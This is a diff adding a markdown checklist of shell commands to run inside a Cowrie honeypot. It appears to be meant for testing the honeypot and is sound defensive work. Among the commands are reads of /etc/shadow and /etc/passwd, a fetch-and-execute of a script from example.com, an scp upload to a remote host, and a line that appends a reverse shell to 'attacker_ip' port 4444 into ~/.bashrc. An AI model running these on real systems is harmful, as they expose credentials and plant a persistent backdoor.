@@ -1,0 +1,96 @@
+# List of commands to run after logging into the Cowrie honeypot
+
+1. File and Directory Listing
+
+```bash
+ls -la
+pwd
+tree
+cat /etc/passwd
+cat /etc/shadow
+cat /proc/version
+```
+
+2. System Information
+
+```bash
+ifconfig
+uname -a
+hostname
+whoami
+id
+w
+who
+uptime
+```
+
+3. Networking
+
+```bash
+ifconfig
+ip a
+netstat -anp
+route
+cat /etc/hosts
+cat /etc/resolv.conf
+```
+
+4. Process/Service Enumeration
+
+```bash
+ps aux
+top
+service --status-all
+```
+
+5. Download/Upload/Execution Simulation
+
+```bash
+wget http://example.com/file.sh
+curl http://example.com/file.sh
+scp file.txt user@remote:/tmp/
+chmod +x file.sh
+./file.sh
+```
+
+6. Privilege Escalation Attempts
+
+```bash
+sudo su
+sudo -l
+su root
+```
+
+7. Editing Files
+
+```bash
+echo "hacked" > /tmp/test.txt
+nano /tmp/test.txt
+vi /tmp/test.txt
+```
+
+8. Persistence/Backdoor Attempts
+
+```bash
+crontab -l
+crontab -e
+echo "bash -i >& /dev/tcp/attacker_ip/4444 0>&1" >> ~/.bashrc
+```
+
+9. Cleanup/Exit
+
+```bash
+history
+clear
+exit
+logout
+```
+
+
+
+
+
+
+
+
+
